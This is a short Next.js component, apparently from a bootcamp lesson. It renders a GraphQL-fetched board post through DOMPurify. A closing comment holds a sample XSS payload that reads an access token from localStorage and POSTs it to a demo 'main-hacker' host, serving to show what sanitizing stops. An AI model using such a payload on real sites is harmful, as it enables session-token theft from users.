"use client";

import { useParams } from "next/navigation";
import { gql, useQuery } from "@apollo/client";
import DOMPurify from "dompurify";

const FETCH_BOARD = gql`
  query fetchBoard($boardId: ID!) {
    fetchBoard(boardId: $boardId) {
      _id
      writer
      title
      contents
    }
  }
`;

export default function DetailPage() {
  const { boardId } = useParams();
  const { data } = useQuery(FETCH_BOARD, {
    variables: { boardId },
  });

  console.log(data);
  return (
    <div>
      <div>작성자: {data?.fetchBoard.writer}</div>
      <div>제목: {data?.fetchBoard.title}</div>
      {typeof window === "undefined" ? (
        <div
          dangerouslySetInnerHTML={{
            __html: DOMPurify.sanitize(data?.fetchBoard.contents),
          }}
        />
      ) : (
        <div></div>
      )}
    </div>
  );
}

/*
contents: """
<img='#' onerror='
const 훔친거 = localStorage.getItem('accessToken');
fetch('http://main-hacker.codebootcamp.co.kr/token',{
 method: "POST",
 headers: {content-type: "application/json"},
 body: JSON.stringify({token:훔친거}),
})'
/>
"""
*/
